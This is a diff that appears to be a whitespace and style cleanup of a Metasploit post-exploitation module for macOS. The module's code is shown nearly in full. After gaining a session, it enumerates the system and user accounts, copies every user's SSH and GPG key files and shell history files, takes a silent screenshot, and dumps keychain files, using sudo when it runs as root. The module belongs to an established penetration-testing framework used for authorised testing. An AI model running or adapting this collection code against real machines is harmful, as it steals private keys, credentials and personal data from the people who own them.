@@ -3,25 +3,26 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::OSX::Priv
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'OS X Gather Mac OS X System Information Enumeration',
-        'Description'   => %q{
-            This module gathers basic system information from Mac OS X Tiger (10.4), through
-            Mojave (10.14).
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Mac OS X System Information Enumeration',
+        'Description' => %q{
+          This module gathers basic system information from Mac OS X Tiger (10.4), through
+          Mojave (10.14).
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-        'Platform'      => [ 'osx' ],
-        'SessionTypes'  => [ "meterpreter", "shell" ]
-      ))
-
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ "meterpreter", "shell" ]
+      )
+    )
   end
 
   # Run Method for when run command is issued
@@ -47,11 +48,11 @@ class MetasploitModule < Msf::Post
     get_keychains(log_folder)
   end
 
-  #parse the dslocal plist in lion
+  # parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
     require "rexml/document"
 
-    doc  = REXML::Document.new(plist_content)
+    doc = REXML::Document.new(plist_content)
     keys = []
 
     doc.elements.each("plist/dict/key") do |element|
@@ -66,19 +67,19 @@ class MetasploitModule < Msf::Post
       element.each_element("*") do |thing|
         data_set = thing.text
         if data_set
-          data << data_set.gsub("\n\t\t","")
+          data << data_set.gsub("\n\t\t", "")
         else
           data << data_set
         end
       end
-      i+=1
+      i += 1
     end
     return fields
   end
 
   # Function for creating the folder for gathered data
   def log_folder_create(log_path = nil)
-    #Get hostname
+    # Get hostname
     case session.type
     when /meterpreter/
       host = Rex::FileUtils.clean_path(sysinfo['Computer'])
@@ -91,9 +92,9 @@ class MetasploitModule < Msf::Post
 
     # Create a directory for the logs
     if log_path
-      logs = ::File.join(log_path, 'logs', 'enum_osx', host + file_name_info )
+      logs = ::File.join(log_path, 'logs', 'enum_osx', host + file_name_info)
     else
-      logs = ::File.join(Msf::Config.log_directory, 'post', 'enum_osx', host + file_name_info )
+      logs = ::File.join(Msf::Config.log_directory, 'post', 'enum_osx', host + file_name_info)
     end
 
     # Create the log directory
@@ -104,7 +105,7 @@ class MetasploitModule < Msf::Post
   # Checks if the target is OSX Server
   def check_server
     # Get the OS Name
-    cmd_exec("/usr/bin/sw_vers", "-productName") =~/Server/
+    cmd_exec("/usr/bin/sw_vers", "-productName") =~ /Server/
   end
 
   # Enumerate the OS Version
@@ -148,23 +149,23 @@ class MetasploitModule < Msf::Post
       print_status("\tEnumerating #{name}")
       returned_data = cmd_exec("/usr/sbin/system_profiler #{profile_datatypes}")
       # Save data lo log folder
-      file_local_write(log_folder+"//#{name}.txt", returned_data)
+      file_local_write(log_folder + "//#{name}.txt", returned_data)
     end
 
     # Enumerate using system commands
     shell_commands.each do |name, command|
       print_status("\tEnumerating #{name}")
-      command_output = cmd_exec(command[0],command[1])
+      command_output = cmd_exec(command[0], command[1])
       # Save data lo log folder
       begin
-        file_local_write(log_folder+"//#{name}.txt",command_output)
+        file_local_write(log_folder + "//#{name}.txt", command_output)
       rescue
         print_error("failed to run #{name}")
       end
     end
   end
 
-  def enum_accounts(log_folder,ver_num)
+  def enum_accounts(log_folder, ver_num)
     # Specific commands for Leopard and Snow Leopard
     leopard_commands = {
       'Users' => ['/usr/bin/dscacheutil', '-q user'],
@@ -186,10 +187,9 @@ class MetasploitModule < Msf::Post
       print_status("\tEnumerating #{name}")
       command_output = cmd_exec(command[0], command[1])
       # Save data lo log folder
-      file_local_write(log_folder+"//#{name}.txt", command_output)
+      file_local_write(log_folder + "//#{name}.txt", command_output)
     end
   end
-
 
   # Method for getting SSH and GPG Keys
   def get_crypto_keys(log_folder)
@@ -207,12 +207,13 @@ class MetasploitModule < Msf::Post
           print_status(".ssh Folder is present")
           ssh_folder = cmd_exec("/bin/ls -ma ~/.ssh").split(", ")
           ssh_folder.each do |k|
-            next if k =~/^\.$|^\.\.$/
+            next if k =~ /^\.$|^\.\.$/
+
             print_status("\tDownloading #{k.strip}")
             ssh_file_content = cmd_exec("/bin/cat ~/.ssh/#{k}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
+            file_local_write(log_folder + "//#{k.strip.gsub(/\W/, "_")}", ssh_file_content)
           end
         end
 
@@ -221,19 +222,21 @@ class MetasploitModule < Msf::Post
           print_status(".gnupg Folder is present")
           gnugpg_folder = cmd_exec("/bin/ls -ma ~/.gnupg").split(", ")
           gnugpg_folder.each do |k|
-            next if k =~/^\.$|^\.\.$/
+            next if k =~ /^\.$|^\.\.$/
+
             print_status("\tDownloading #{k.strip}")
             gpg_file_content = cmd_exec("/bin/cat ~/.gnupg/#{k.strip}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}", gpg_file_content)
+            file_local_write(log_folder + "//#{k.strip.gsub(/\W/, "_")}", gpg_file_content)
           end
         end
       else
         users = []
-        users_folder = cmd_exec("/bin/ls","/Users")
+        users_folder = cmd_exec("/bin/ls", "/Users")
         users_folder.each_line do |u|
           next if u.chomp =~ /Shared|\.localized/
+
           users << u.chomp
         end
 
@@ -243,16 +246,16 @@ class MetasploitModule < Msf::Post
             print_status(".ssh Folder is present for #{u}")
             ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.ssh").split(", ")
             ssh_folder.each do |k|
-              next if k =~/^\.$|^\.\.$/
+              next if k =~ /^\.$|^\.\.$/
+
               print_status("\tDownloading #{k.strip}")
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
+              file_local_write(log_folder + "//#{k.strip.gsub(/\W/, "_")}", ssh_file_content)
             end
           end
         end
-
 
         users.each do |u|
           user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(", ")
@@ -260,12 +263,13 @@ class MetasploitModule < Msf::Post
             print_status(".gnupg Folder is present for #{u}")
             ssh_folder = cmd_exec("/bin/ls -ma /Users/#{u}/.gnupg").split(", ")
             ssh_folder.each do |k|
-              next if k =~/^\.$|^\.\.$/
+              next if k =~ /^\.$|^\.\.$/
+
               print_status("\tDownloading #{k.strip}")
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
+              file_local_write(log_folder + "//#{k.strip.gsub(/\W/, "_")}", ssh_file_content)
             end
           end
         end
@@ -292,7 +296,7 @@ class MetasploitModule < Msf::Post
         end
       else
         cmd_exec("/usr/sbin/screencapture", "-x /tmp/#{picture_name}.jpg")
-        file_local_write(log_folder+"//screenshot.jpg",
+        file_local_write(log_folder + "//screenshot.jpg",
                          cmd_exec("/bin/cat /tmp/#{picture_name}.jpg"))
         cmd_exec("/usr/bin/srm", "-m -z /tmp/#{picture_name}.jpg")
       end
@@ -303,10 +307,11 @@ class MetasploitModule < Msf::Post
   def dump_bash_history(log_folder)
     print_status("Extracting history files")
     users = []
-    users_folder = cmd_exec("/bin/ls","/Users")
-    current_user = cmd_exec("/usr/bin/id","-nu")
+    users_folder = cmd_exec("/bin/ls", "/Users")
+    current_user = cmd_exec("/usr/bin/id", "-nu")
     users_folder.each_line do |u|
       next if u.chomp =~ /Shared|\.localized/
+
       users << u.chomp
     end
 
@@ -322,13 +327,12 @@ class MetasploitModule < Msf::Post
           sh_file = cmd_exec("/bin/cat ~/#{f.strip}")
 
           # Save data lo log folder
-          file_local_write(log_folder+"//root_#{f.strip}.txt",sh_file)
+          file_local_write(log_folder + "//root_#{f.strip}.txt", sh_file)
         end
       end
 
       # Getting the history files for all users
       users.each do |u|
-
         # Lets get a list of all the files on the users folder and place them in an array
         user_folder = cmd_exec("/bin/ls -ma /Users/#{u}/").split(", ")
         user_folder.each do |f|
@@ -338,7 +342,7 @@ class MetasploitModule < Msf::Post
             sh_file = cmd_exec("/bin/cat /Users/#{u}/#{f.strip}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{u}_#{f.strip}.txt",sh_file)
+            file_local_write(log_folder + "//#{u}_#{f.strip}.txt", sh_file)
           end
         end
       end
@@ -352,7 +356,7 @@ class MetasploitModule < Msf::Post
           sh_file = cmd_exec("/bin/cat ~/#{f.strip}")
 
           # Save data lo log folder
-          file_local_write(log_folder+"//#{current_user}_#{f.strip}.txt",sh_file)
+          file_local_write(log_folder + "//#{current_user}_#{f.strip}.txt", sh_file)
         end
       end
     end
@@ -361,9 +365,10 @@ class MetasploitModule < Msf::Post
   # Download configured Keychains
   def get_keychains(log_folder)
     users = []
-    users_folder = cmd_exec("/bin/ls","/Users")
+    users_folder = cmd_exec("/bin/ls", "/Users")
     users_folder.each_line do |u|
       next if u.chomp =~ /Shared|\.localized/
+
       users << u.chomp
     end
     if is_root?
@@ -371,11 +376,10 @@ class MetasploitModule < Msf::Post
         print_status("Enumerating and Downloading keychains for #{u}")
         keychain_files = cmd_exec("/usr/bin/sudo -u #{u} -i /usr/bin/security list-keychains").split("\n")
         keychain_files.each do |k|
-
           keychain_file = cmd_exec("/bin/cat #{k.strip}")
 
           # Save data lo log folder
-          file_local_write(log_folder+"//#{u}#{k.strip.gsub(/\W/,"_")}",keychain_file)
+          file_local_write(log_folder + "//#{u}#{k.strip.gsub(/\W/, "_")}", keychain_file)
         end
       end
     else
@@ -383,11 +387,10 @@ class MetasploitModule < Msf::Post
       print_status("Enumerating and Downloading keychains for #{current_user}")
       keychain_files = cmd_exec("/usr/bin/security list-keychains").split("\n")
       keychain_files.each do |k|
-
         keychain_file = cmd_exec("/bin/cat #{k.strip}")
 
         # Save data lo log folder
-        file_local_write(log_folder+"//#{current_user}#{k.strip.gsub(/\W/,"_")}",keychain_file)
+        file_local_write(log_folder + "//#{current_user}#{k.strip.gsub(/\W/, "_")}", keychain_file)
       end
     end
   end
